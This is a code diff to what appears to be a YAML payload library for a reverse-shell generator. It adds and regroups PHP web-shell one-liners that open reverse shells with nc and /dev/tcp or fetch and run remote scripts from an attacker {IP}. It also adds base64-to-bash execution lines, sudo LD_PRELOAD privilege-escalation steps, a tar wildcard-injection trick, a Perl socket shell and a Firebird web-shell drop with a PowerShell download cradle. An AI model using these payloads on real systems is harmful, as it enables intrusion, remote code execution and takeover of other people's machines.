@@ -16,6 +16,8 @@ payload:
     - |
       __import__("os").system("nc -e /bin/sh {IP} {PORT}")
     - |
+      __import__("os").system("echo {BASE64} | base64 -d | bash")
+    - |
       wget${IFS}http://{IP}/shell.py${IFS}-O${IFS}shell.py;python${IFS}shell.py
 
       python -c 'import pty; pty.spawn("/bin/bash")'
@@ -62,6 +64,8 @@ payload:
       echo {BASE64} | base64 -d | bash
     - |
       echo {BASE64_URLENCODE} | base64 -d | bash
+    - |
+      echo+{BASE64_URLENCODE}+|+base64+-d+|+bash
   c:
     - |
       Compile : gcc shell.c -o shell
@@ -107,7 +111,7 @@ payload:
       }
     - |
       Compile : gcc -o libchill.so.1 -shared -fPIC libchill.c
-      sudo LD_LIBRARY_PATH=/tmp <SOME BINARY>
+      Exploit : sudo LD_LIBRARY_PATH=/tmp <SOME BINARY>
 
       #include <stdio.h>
       #include <stdlib.h>
@@ -121,7 +125,7 @@ payload:
       }
     - |
       Compile : gcc -fPIC -shared -nostartfiles -o preload.so preload.c
-      sudo LD_PRELOAD=/tmp/preload.so binary
+      Exploit : sudo LD_PRELOAD=/tmp/preload.so binary
 
       #include <stdio.h>
       #include <sys/types.h>
@@ -260,20 +264,51 @@ payload:
       $👽($🐚);
       ?>
     - |
+      # System()
+      
       <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f'); ?>
-    - |
-      <?php exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
-    - |
+      <?php system("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
+      <?php system("echo {BASE64} | base64 -d | bash"); ?>
+      <?php system("echo+{BASE64_URLENCODE}+|+base64+-d+|+bash"); ?>
       <?php system("curl http://{IP}/shell.php|php"); ?>
     - |
-      <?php shell_exec("curl http://{IP}/shell.php|php"); ?>
-    - |
-      <?php passthru("curl http://{IP}/shell.php|php"); ?>
-    - |
+      # Exec()
+      
+      <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"); ?>
+      <?php exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
+      <?php exec("echo {BASE64} | base64 -d | bash"); ?>
+      <?php exec("echo+{BASE64_URLENCODE}+|+base64+-d+|+bash"); ?>
       <?php exec("curl http://{IP}/shell.php|php"); ?>
     - |
-      <?php preg_replace('/.*/e', 'system("curl http://{IP}/shell.php|php");', ''); ?>
+      # Shell_Exec()
+      
+      <?php shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"); ?>
+      <?php shell_exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
+      <?php shell_exec("echo {BASE64} | base64 -d | bash"); ?>
+      <?php shell_exec("echo+{BASE64_URLENCODE}+|+base64+-d+|+bash"); ?>
+      <?php shell_exec("curl http://{IP}/shell.php|php"); ?>
     - |
+      # Passthru()
+      
+      <?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"); ?>
+      <?php passthru("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
+      <?php passthru("echo {BASE64} | base64 -d | bash"); ?>
+      <?php passthru("echo+{BASE64_URLENCODE}+|+base64+-d+|+bash"); ?>
+      <?php passthru("curl http://{IP}/shell.php|php"); ?>
+    - |
+      # Preg_replace()
+      
+      <?php preg_replace('/.*/e', 'system("echo {BASE64} | base64 -d | bash");', ''); ?>
+      <?php preg_replace('/.*/e', 'exec("echo {BASE64} | base64 -d | bash");', ''); ?>
+      <?php preg_replace('/.*/e', 'passthru("echo {BASE64} | base64 -d | bash");', ''); ?>
+      <?php preg_replace('/.*/e', 'shell_exec("echo {BASE64} | base64 -d | bash");', ''); ?>
+    - |
+      # Backtick
+      
+      <?php $output = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f`; echo "<pre>$output</pre>"; ?>
+      <?php $output = `/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'`; echo "<pre>$output</pre>"; ?>
+      <?php $output = `echo {BASE64} | base64 -d | bash`; echo "<pre>$output</pre>"; ?>
+      <?php $output = `echo+{BASE64_URLENCODE}+|+base64+-d+|+bash`; echo "<pre>$output</pre>"; ?>
       <?php $output = `curl http://{IP}/shell.php|php`; echo "<pre>$output</pre>"; ?>
     - |
       msfvenom -p php/reverse_php LHOST={IP} LPORT={PORT} -f raw -o shell.php
@@ -281,6 +316,9 @@ payload:
     - |
       perl -e 'use Socket;$i="{IP}";           $p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
     - |
+      # Save as shell.pl
+      # Exploit: perl shell.pl
+      
       use Socket
 
       $i="{IP}";
@@ -477,9 +515,18 @@ payload:
       chmod 777 ./"--checkpoint=1"
       chmod 777 ./"--checkpoint-action=exec=sh shell.sh"
       chmod 777 shell.sh
+    - |
+      touch -- "--checkpoint=1"
+      touch -- "--checkpoint-action=exec=sh shell.sh"
+      echo "echo {BASE64} | base64 -d | bash" > shell.sh
+      chmod 777 ./"--checkpoint=1"
+      chmod 777 ./"--checkpoint-action=exec=sh shell.sh"
+      chmod 777 shell.sh
   pickle: 
     - |
       {PICKLE}
+    - |
+      {PICKLE_BASH}
   java: 
     - |
       Usage : java shell.java
@@ -1445,7 +1492,8 @@ payload:
   firebird:
     - |
       => Save this as exploit.sql and transfer to victim machine.
-
+      => Base64 (Original) = IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1')
+      
       CREATE TABLE a( x blob);
       ALTER DATABASE ADD DIFFERENCE FILE 'C:\inetpub\wwwroot\shell.asp';
       ALTER DATABASE BEGIN BACKUP;
@@ -1484,7 +1532,7 @@ payload:
   log4j:
     - |
       # Commands To Run
-      -> Run javac Exploit.java -source 8 -target 8
+      -> Run javac Exploit.java
       -> Run python3 -m http.server 80 in the directory of Exploit.java
       -> Run java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{IP}/#Exploit" (Listening Port)
     - |
